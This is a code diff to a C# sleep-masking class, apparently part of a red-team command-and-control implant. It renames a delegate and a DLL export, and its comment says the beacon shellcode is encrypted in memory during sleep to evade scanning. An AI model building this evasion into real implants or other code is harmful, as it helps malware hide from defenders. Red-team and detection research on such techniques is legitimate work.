@@ -9,10 +9,10 @@ namespace ApolloInterop.Classes.Core
     public static class SleepMask
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate void D1rkSleepDelegate(uint dwMilliseconds);
+        private delegate void MaskedSleepDelegate(uint dwMilliseconds);
 
         private static IntPtr _hModule = IntPtr.Zero;
-        private static D1rkSleepDelegate _d1rkSleep = null;
+        private static MaskedSleepDelegate _maskedSleep = null;
         private static readonly object _lock = new object();
         private static bool _initAttempted = false;
         private static bool _available = false;
@@ -103,7 +103,7 @@ namespace ApolloInterop.Classes.Core
                     if (_hModule == IntPtr.Zero)
                         return;
 
-                    IntPtr pFunc = GetProcAddress(_hModule, "D1rkSleep");
+                    IntPtr pFunc = GetProcAddress(_hModule, "MaskedSleep");
                     if (pFunc == IntPtr.Zero)
                     {
                         FreeLibrary(_hModule);
@@ -111,8 +111,8 @@ namespace ApolloInterop.Classes.Core
                         return;
                     }
 
-                    _d1rkSleep = (D1rkSleepDelegate)Marshal.GetDelegateForFunctionPointer(
-                        pFunc, typeof(D1rkSleepDelegate));
+                    _maskedSleep = (MaskedSleepDelegate)Marshal.GetDelegateForFunctionPointer(
+                        pFunc, typeof(MaskedSleepDelegate));
                     _available = true;
                 }
                 catch
@@ -123,23 +123,24 @@ namespace ApolloInterop.Classes.Core
         }
 
         /// <summary>
-        /// Performs an obfuscated sleep using D1rkSleep. The calling thread is blocked
-        /// for the specified duration while the module's executable sections are encrypted.
-        /// Returns immediately if D1rkSleep is not available or not enabled.
+        /// Performs an obfuscated sleep using the masker DLL. The beacon shellcode
+        /// region (registered by the loader via SetBeaconRegion) is encrypted during
+        /// the sleep window and decrypted on wake.
+        /// Falls back to normal sleep if the masker is not available.
         /// </summary>
         public static void ObfuscatedSleep(uint milliseconds)
         {
             if (!IsAvailable || milliseconds == 0)
                 return;
 
-            _d1rkSleep(milliseconds);
+            _maskedSleep(milliseconds);
         }
 
         public static void Cleanup()
         {
             lock (_lock)
             {
-                _d1rkSleep = null;
+                _maskedSleep = null;
                 _available = false;
                 if (_hModule != IntPtr.Zero)
                 {
